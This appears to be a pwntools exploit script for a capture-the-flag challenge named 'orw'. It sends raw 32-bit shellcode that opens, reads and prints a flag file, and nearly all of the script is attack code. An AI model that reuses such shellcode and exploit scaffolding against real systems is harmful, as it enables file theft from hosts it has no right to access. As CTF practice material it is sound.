from pwn import *

def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main
continue
'''.format(**locals())

exe = './orw'

elf = ELF(exe)

sla  = lambda r, s: conn.sendlineafter(r, s)
sl   = lambda    s: conn.sendline(s)
sa   = lambda r, s: conn.sendafter(r, s)
se   = lambda s: conn.send(s)
ru   = lambda r, **kwargs: conn.recvuntil(r, **kwargs)
rl   = lambda : conn.recvline()
uu32 = lambda d: u32(d.ljust(4, b'\x00'))
uu64 = lambda d: u64(d.ljust(8, b'\x00'))

conn = start()

shellcode = b"\x55\x89\xEC\x83\xEC\x20\x6A\x05\x58\x6A\x00\x68\x66\x6C\x61\x67\x68\x6F\x72\x77\x2F\x68\x6F\x6D\x65\x2F\x68\x2F\x2F\x2F\x68\x89\xE3\xB9\x02\x00\x00\x00\x31\xD2\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\xB9\x00\xA0\x04\x08\xBA\x40\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xB9\x00\xA0\x04\x08\xBA\x40\x00\x00\x00\xCD\x80"

conn.recvuntil(b'shellcode:')
#sla(b'shellcode:', shellcode)
conn.sendline(shellcode)

conn.interactive()

